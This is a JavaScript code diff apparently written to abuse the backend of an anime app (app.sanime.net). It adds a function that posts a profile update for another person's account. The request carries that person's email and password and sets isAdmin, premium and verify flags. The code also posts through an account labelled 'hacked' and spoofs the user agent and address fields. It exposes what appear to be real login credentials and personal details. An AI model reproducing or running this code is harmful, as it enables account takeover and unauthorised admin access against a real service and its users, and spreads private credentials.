@@ -134,11 +134,34 @@ function blockUsers(comment) {
 function sendPost() {
      let postData={  post: text, hasFire: !1, hasAnime: !1, hasImage: "", anime: [], youtube: "", userAddress: '2.2.2.2' } ;
       let body ={
+             
       email:"hacked.mebm@gmail.com", password:"hacked.mebm", useragent: "IBRAHIMSEVEN",item:
       btoa(unescape(encodeURIComponent(JSON.stringify(postData)))), android: true};
      
     request({
         url:"https://app.sanime.net/function/h10.php?page=sendPost",
+        method: "POST",
+        //json: true,   // <--Very important!!!
+        body:  qs.stringify(body),
+    headers: {"Content-Type": "application/x-www-form-urlencoded",
+    'User-Agent': 'IBRAHIMSEVEN',//SevenZero',
+  },
+    }, function (error, response, body){
+        if(response.statusCode==200){
+            let json = JSON.parse(response.body);
+            console.log(json.message);
+    }
+    });
+}
+function update() {
+    let data={  id:"2223",email:"monteeljaili@gmail.com",password:"20032003",image:"https://app.sanime.net/secure/image/308364.jpg",bio:"Just Mont!",username:"Mont",isAdmin:true,"premium":1,country:"37.43.32.221",verify:1,opened:100,md5:"ljvAv6iWCjIT48tyXpiNj7PX7W+IekExOx3s42+29KlYAQSDKBthVSi5krJ7MJeZkYnrDo9iu+FRAIVMcrP2jdsJxc65Q7EzSknrRoRoz3I=",time:"2024-05-10",file:"514bbb87bdd831a7f4a80f4b5bb6655b",newpass:""} ;
+      let body ={
+             
+      email:"monteeljaili@gmail.com", password:"PIaudrJE", useragent: "IBRAHIMSEVEN",item:
+      btoa(unescape(encodeURIComponent(JSON.stringify(data)))), android: true};
+     
+    request({
+        url:"https://app.sanime.net/function/h10.php?page=update",
         method: "POST",
         //json: true,   // <--Very important!!!
         body:  qs.stringify(body),
